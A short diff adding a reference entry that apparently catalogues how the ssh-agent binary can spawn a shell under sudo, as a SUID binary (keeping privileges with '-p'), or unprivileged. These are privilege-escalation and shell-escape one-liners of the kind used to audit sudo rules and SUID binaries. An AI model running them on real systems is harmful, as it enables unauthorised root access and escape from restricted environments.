@@ -1,0 +1,14 @@
+ssh-agent
+=========
+
+Shell
+-----
+
+[Sudo]
+    ssh-agent /bin/sh
+
+[SUID]
+    ssh-agent /bin/sh -p
+
+[Unprivileged]
+    ssh-agent /bin/sh
